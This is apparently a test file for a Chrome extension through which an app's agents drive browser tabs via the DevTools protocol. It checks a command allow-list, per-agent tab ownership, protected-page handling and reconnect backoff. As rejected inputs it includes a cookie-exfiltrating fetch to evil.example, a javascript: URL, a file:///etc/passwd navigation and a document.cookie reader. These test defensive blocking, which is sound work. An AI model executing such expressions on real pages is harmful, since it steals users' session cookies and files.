// The extension's modules against a stand-in `chrome`: the allow-list, tab
// ownership, and the link's states, backoff and request handling.
// Run: node --test chrome-extension/tests/

import assert from 'node:assert/strict';
import { test } from 'node:test';

import { Cdp, FUNCTIONS, METHODS, vet } from '../extension/src/cdp.js';
import { BACKOFF_MS, Link } from '../extension/src/link.js';
import { handle } from '../extension/src/ops.js';
import {
  CODES,
  ExtError,
  PROTOCOL,
  fail,
  isWebUrl,
  parseRequest,
} from '../extension/src/protocol.js';
import { Tabs } from '../extension/src/tabs.js';
import { fakeChrome } from './fake-chrome.mjs';

const tick = () => new Promise((r) => setTimeout(r, 0));

test('only the app’s own CDP commands and expressions get through', () => {
  assert.throws(
    () => vet('Runtime.callFunctionOn', {}),
    (e) => e.code === CODES.notAllowed
  );
  assert.throws(
    () => vet('Network.getCookies', {}),
    (e) => e.code === CODES.notAllowed
  );
  assert.throws(
    () => vet('Storage.getCookies', {}),
    (e) => e.code === CODES.notAllowed
  );
  assert.throws(
    () => vet('Runtime.evaluate', { expression: 'fetch("https://evil.example/"+document.cookie)' }),
    (e) => e.code === CODES.notAllowed
  );
  // An allowed expression is narrowed: no awaitPromise, no includeCommandLineAPI.
  const clean = vet('Runtime.evaluate', {
    expression: 'document.readyState',
    includeCommandLineAPI: true,
    awaitPromise: true,
  });
  assert.deepEqual(clean, { expression: 'document.readyState', returnByValue: true, silent: true });
  assert.throws(
    () => vet('Page.navigate', { url: 'javascript:alert(1)' }),
    (e) => e.code === CODES.notAllowed
  );
  assert.throws(
    () => vet('Page.navigate', { url: 'file:///etc/passwd' }),
    (e) => e.code === CODES.notAllowed
  );
  assert.deepEqual(vet('Page.navigate', { url: 'https://example.com/', referrer: 'x' }), {
    url: 'https://example.com/',
  });
  assert.ok(METHODS.has('Input.dispatchMouseEvent'));
  assert.ok(!METHODS.has('Target.createTarget'));
});

test('requests are checked before anything runs', () => {
  assert.throws(
    () => parseRequest({ t: 'req', id: 1, op: { kind: 'eval_anything' } }),
    (e) => e.code === CODES.badRequest
  );
  assert.throws(
    () => parseRequest({ t: 'res', id: 1, op: {} }),
    (e) => e.code === CODES.badRequest
  );
  assert.deepEqual(parseRequest({ t: 'req', id: 3, op: { kind: 'ping' } }), {
    id: 3,
    op: { kind: 'ping' },
  });
  assert.deepEqual(fail(4, new ExtError(CODES.noTab, 'gone')), {
    t: 'res',
    id: 4,
    ok: false,
    error: { code: 'no_tab', message: 'gone' },
  });
  assert.equal(fail(5, new Error('boom')).error.code, 'internal');
  assert.ok(isWebUrl('http://localhost:3000/'));
  assert.ok(!isWebUrl('chrome://settings'));
});

test('an agent reaches only the tabs it opened', async () => {
  const { chrome } = fakeChrome();
  const tabs = new Tabs(chrome);
  const events = [];
  tabs.listen((e) => events.push(e));
  const cdp = new Cdp(chrome, tabs);
  const parts = { tabs, cdp };
  const a = await handle(
    { kind: 'tabs_open', agent: 'ana', label: 'Ana', url: 'https://example.com/' },
    parts
  );
  const b = await handle(
    { kind: 'tabs_open', agent: 'bo', label: 'Bo', url: 'https://example.org/' },
    parts
  );
  assert.equal(a.agent, 'ana');
  assert.equal(a.window_id, b.window_id, 'one agents’ window');
  await assert.rejects(
    handle({ kind: 'tab_get', agent: 'bo', tab_id: a.tab_id }, parts),
    (e) => e.code === CODES.notOwned
  );
  await assert.rejects(
    handle(
      {
        kind: 'cdp',
        agent: 'bo',
        tab_id: a.tab_id,
        method: 'Accessibility.getFullAXTree',
        params: {},
      },
      parts
    ),
    (e) => e.code === CODES.notOwned
  );
  await assert.rejects(
    handle({ kind: 'tab_get', agent: 'ana', tab_id: 9999 }, parts),
    (e) => e.code === CODES.notOwned
  );
  const r = await handle(
    {
      kind: 'cdp',
      agent: 'ana',
      tab_id: a.tab_id,
      method: 'Accessibility.getFullAXTree',
      params: {},
    },
    parts
  );
  assert.deepEqual(r, { ok: 'Accessibility.getFullAXTree' });
  const list = await handle({ kind: 'tabs_list' }, parts);
  assert.equal(list.length, 2);
  // The user closes Ana's tab: the app hears so.
  await chrome.tabs.remove(a.tab_id);
  await tick();
  assert.deepEqual(events.at(-1), {
    t: 'event',
    event: { kind: 'tab_closed', tab_id: a.tab_id, agent: 'ana' },
  });
  const released = await handle({ kind: 'release', agent: 'bo' }, parts);
  assert.equal(released.closed, 1);
  assert.equal((await handle({ kind: 'tabs_list' }, parts)).length, 0);
});

test('a page Chrome protects, or the user’s Cancel, stops driving', async () => {
  const { chrome } = fakeChrome();
  const tabs = new Tabs(chrome);
  tabs.listen(() => {});
  const cdp = new Cdp(chrome, tabs);
  const events = [];
  cdp.listen((e) => events.push(e));
  const t = await tabs.open('ana', 'Ana', 'https://example.com/');
  // The tab moved to the Web Store.
  await chrome.tabs.update(t.tab_id, { url: 'https://chromewebstore.google.com/detail/x' });
  await assert.rejects(
    cdp.send('ana', t.tab_id, 'Page.getLayoutMetrics', {}),
    (e) => e.code === CODES.protected
  );
  await chrome.tabs.update(t.tab_id, { url: 'https://example.com/' });
  await cdp.send('ana', t.tab_id, 'Page.getLayoutMetrics', {});
  chrome.debugger.onDetach.fire({ tabId: t.tab_id }, 'canceled_by_user');
  await tick();
  assert.equal(events.at(-1).event.kind, 'debugger_detached');
  await assert.rejects(
    cdp.send('ana', t.tab_id, 'Page.getLayoutMetrics', {}),
    (e) => e.code === CODES.attachFailed
  );
});

function link(chrome, handleOp = async () => ({})) {
  const timers = [];
  const states = [];
  const l = new Link(chrome, {
    handle: handleOp,
    profile: async () => ({ profileId: 'p-1', profileLabel: 'Work' }),
    onState: (s) => states.push(s),
    setTimer: (f, ms) => {
      timers.push({ f, ms });
      return timers.length;
    },
  });
  return { l, timers, states };
}

test('the link says hello, answers requests, and reports its state', async () => {
  const { chrome } = fakeChrome();
  const { l } = link(chrome, async (op) => ({ echo: op.kind }));
  await l.connect();
  const port = chrome.runtime.ports[0];
  assert.equal(port.name, 'io.native.mogbot.chrome_link');
  assert.deepEqual(port.posted[0], {
    t: 'hello',
    v: PROTOCOL,
    extension_version: '0.1.0',
    profile_id: 'p-1',
    profile_label: 'Work',
    user_agent: port.posted[0].user_agent,
  });
  port.onMessage.fire({ t: 'welcome', v: PROTOCOL, app_version: '1' });
  await tick();
  assert.equal(l.state, 'connected');
  port.onMessage.fire({ t: 'req', id: 9, op: { kind: 'ping' } });
  await tick();
  assert.deepEqual(port.posted.at(-1), { t: 'res', id: 9, ok: true, result: { echo: 'ping' } });
  port.onMessage.fire({ t: 'req', id: 10, op: { kind: 'nope' } });
  await tick();
  assert.equal(port.posted.at(-1).error.code, 'bad_request');
});

test('backoff: quick retries, the app away, the host missing, a version gap', async () => {
  const { chrome } = fakeChrome();
  const { l, timers } = link(chrome);
  await l.connect();
  let port = chrome.runtime.ports[0];
  // Chrome closed the port (the host died): retry after the first step.
  port.onDisconnect.fire();
  assert.equal(timers.at(-1).ms, BACKOFF_MS[0]);
  timers.at(-1).f();
  await tick();
  port = chrome.runtime.ports[1];
  // The host says the app isn't running, then exits.
  port.onMessage.fire({ t: 'unavailable', reason: 'app_not_running' });
  await tick();
  assert.equal(l.state, 'app_not_running');
  port.onDisconnect.fire();
  assert.equal(timers.at(-1).ms, BACKOFF_MS.at(-1), 'the slow end while the app is away');
  timers.at(-1).f();
  await tick();
  // The host isn't installed.
  port = chrome.runtime.ports[2];
  chrome.runtime.lastError = { message: 'Specified native messaging host not found.' };
  port.onDisconnect.fire();
  chrome.runtime.lastError = undefined;
  assert.equal(l.state, 'no_host');
  timers.at(-1).f();
  await tick();
  // An app that speaks another version: stop until the alarm or an update.
  port = chrome.runtime.ports[3];
  const before = timers.length;
  port.onMessage.fire({ t: 'bye', reason: 'version' });
  await tick();
  port.onDisconnect.fire();
  assert.equal(l.state, 'update_needed');
  assert.equal(timers.length, before, 'no retry loop on a version gap');
  // The alarm still brings it back to try.
  l.wake();
  await tick();
  assert.equal(chrome.runtime.ports.length, 5);
});

test('a stale port (replaced) is ignored', async () => {
  const { chrome } = fakeChrome();
  const { l, timers } = link(chrome);
  await l.connect();
  const port = chrome.runtime.ports[0];
  port.onMessage.fire({ t: 'welcome', v: PROTOCOL });
  await tick();
  port.onMessage.fire({ t: 'bye', reason: 'replaced' });
  await tick();
  const n = timers.length;
  port.onDisconnect.fire();
  assert.equal(timers.length, n);
  port.onMessage.fire({ t: 'req', id: 1, op: { kind: 'ping' } });
  await tick();
  assert.equal(port.posted.length, 1, 'only the hello: nothing answered on a stale port');
});

test('a node function runs only if it is the app’s own, with numbers only', () => {
  const [fn] = FUNCTIONS;
  assert.ok(fn.includes("behavior: 'instant'"));
  const clean = vet('Runtime.callFunctionOn', {
    objectId: 'o-1',
    functionDeclaration: fn,
    arguments: [{ value: 0 }, { value: 120 }],
    awaitPromise: true,
    userGesture: true,
  });
  assert.deepEqual(clean, {
    objectId: 'o-1',
    functionDeclaration: fn,
    arguments: [{ value: 0 }, { value: 120 }],
    returnByValue: true,
    silent: true,
  });
  for (const bad of [
    { objectId: 'o', functionDeclaration: 'function () { return document.cookie }' },
    { objectId: 'o', functionDeclaration: fn, arguments: [{ value: 'x' }] },
    { objectId: 'o', functionDeclaration: fn, arguments: [{ objectId: 'other' }] },
    { functionDeclaration: fn, arguments: [] },
    { executionContextId: 1, functionDeclaration: fn, arguments: [] },
  ]) {
    assert.throws(
      () => vet('Runtime.callFunctionOn', bad),
      (e) => e.code === CODES.notAllowed,
      JSON.stringify(bad).slice(0, 80)
    );
  }
  assert.deepEqual(vet('DOM.resolveNode', { backendNodeId: 4, objectGroup: 'x' }), {
    backendNodeId: 4,
  });
  assert.throws(
    () => vet('DOM.resolveNode', { nodeId: 4 }),
    (e) => e.code === CODES.notAllowed
  );
});

test('input to a tab that hasn’t answered the last input is refused, not queued', async () => {
  const { chrome, sent } = fakeChrome();
  const tabs = new Tabs(chrome);
  tabs.listen(() => {});
  const cdp = new Cdp(chrome, tabs);
  cdp.listen(() => {});
  const t = await tabs.open('ana', 'Ana', 'https://example.com/');
  // Chrome holds a pointer move until the tab paints.
  let release;
  const plain = chrome.debugger.sendCommand;
  chrome.debugger.sendCommand = async (target, method, params) => {
    if (method === 'Input.dispatchMouseEvent' && params.type === 'mouseMoved') {
      sent.push({ method, params });
      await new Promise((r) => (release = r));
      return {};
    }
    return plain(target, method, params);
  };
  const move = cdp.send('ana', t.tab_id, 'Input.dispatchMouseEvent', {
    type: 'mouseMoved',
    x: 1,
    y: 1,
  });
  await tick();
  await tick();
  const before = sent.length;
  // The click behind it is refused at once, and never sent.
  await assert.rejects(
    cdp.send('ana', t.tab_id, 'Input.dispatchMouseEvent', {
      type: 'mousePressed',
      x: 1,
      y: 1,
      button: 'left',
      clickCount: 1,
    }),
    (e) => e.code === CODES.busy
  );
  assert.equal(sent.length, before, 'nothing was queued behind it');
  // Reading still works meanwhile.
  await cdp.send('ana', t.tab_id, 'Page.getLayoutMetrics', {});
  release();
  await move;
  // Once Chrome answered, input goes again.
  await cdp.send('ana', t.tab_id, 'Input.dispatchKeyEvent', { type: 'keyDown', key: 'Tab' });
  assert.equal(sent.at(-1).method, 'Input.dispatchKeyEvent');
});

test('a request answered after its port dropped never goes to the new port', async () => {
  const { chrome } = fakeChrome();
  let finish;
  const { l } = link(chrome, (op) =>
    op.kind === 'tabs_list' ? new Promise((r) => (finish = r)) : Promise.resolve({})
  );
  await l.connect();
  const first = chrome.runtime.ports[0];
  first.onMessage.fire({ t: 'welcome', v: PROTOCOL });
  await tick();
  first.onMessage.fire({ t: 'req', id: 4, op: { kind: 'tabs_list' } });
  await tick();
  // The port drops while the request runs; the link opens a new one.
  first.onDisconnect.fire();
  l.wake();
  await tick();
  const second = chrome.runtime.ports[1];
  second.onMessage.fire({ t: 'welcome', v: PROTOCOL });
  await tick();
  finish([]);
  await tick();
  // The app already told the agent the step may not have happened.
  assert.ok(!second.posted.some((m) => m.t === 'res'), 'the late answer went nowhere');
});
